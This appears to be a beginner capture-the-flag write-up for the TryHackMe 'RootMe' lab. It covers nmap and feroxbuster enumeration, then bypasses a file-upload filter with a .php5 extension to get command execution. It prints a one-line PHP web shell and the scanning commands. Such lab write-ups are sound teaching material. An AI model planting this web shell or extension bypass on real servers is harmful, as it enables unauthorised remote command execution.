# RootMe

**Platform:** TryHackMe  
**Difficulty:** Easy  
**Category:** Red Team  

## Overview
A ctf for beginners, can you root me?

## Enumeration

### Command Used
```bash
sudo nmap 10.49.136.148 -n -T4 -sC -sV -oN Nmap-Scan
```
### Nmap Scan
```ansi
Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-27 13:18 +0530
Nmap scan report for 10.49.136.148
Host is up (0.0062s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 93:2f:9d:77:1b:c1:f4:9e:5c:55:bb:8f:06:1b:e0:e8 (RSA)
|   256 c3:26:6a:7c:51:2c:2c:1b:79:f5:a3:eb:28:09:f8:ec (ECDSA)
|_  256 25:49:f1:e7:eb:17:85:24:75:37:fc:2c:9f:6e:6e:91 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: HackIT - Home
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.20 seconds
```
### Analysing

Based on the Nmap results:

- Port 22 (SSH) → Possible brute-force or credential reuse
- Port 80 (HTTP) → Web application to enumerate

## Web Enumeration

Accessed:

- http://10.49.136.148/

![Homepage](screenshots/1.png)

- Nothing Interesting Found in Source Code

### Directory & File Busting

### Command Used
```bash
sudo feroxbuster -u http://10.49.136.148/ -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt
```
### Found 

- http://10.49.136.148/uploads/
- http://10.49.136.148/css/
- http://10.49.136.148/js/
- http://10.49.136.148/panel/

### Looking into Directories and files

- /panel/

![Panel](screenshots/2.png)

## File Upload Functionality

### Observation

During web enumeration, a `/panel` endpoint was discovered. Upon accessing it, a file upload interface was identified, allowing users to select and upload files.

### File used Location
```bash
/home/user/php-reverse-shell.php5
```

![Blocked](screenshots.3png)

### Analysis

During testing, it was observed that direct upload of `.php` files was restricted by the application.

However, the application failed to block alternative PHP extensions such as `.php5`, indicating weak file type validation.

---
![Allowed](screenshots/4,png)

### Exploitation

A malicious file was created using a supported PHP extension:

```php
<?php system($_GET['cmd']); ?>
```

Saved as:

```
shell.php5
```

The file was successfully uploaded through the panel.

---

### Result

The uploaded file was accessed via the browser and executed successfully, allowing remote command execution.

This confirmed that the application is vulnerable to unrestricted file upload via extension bypass.


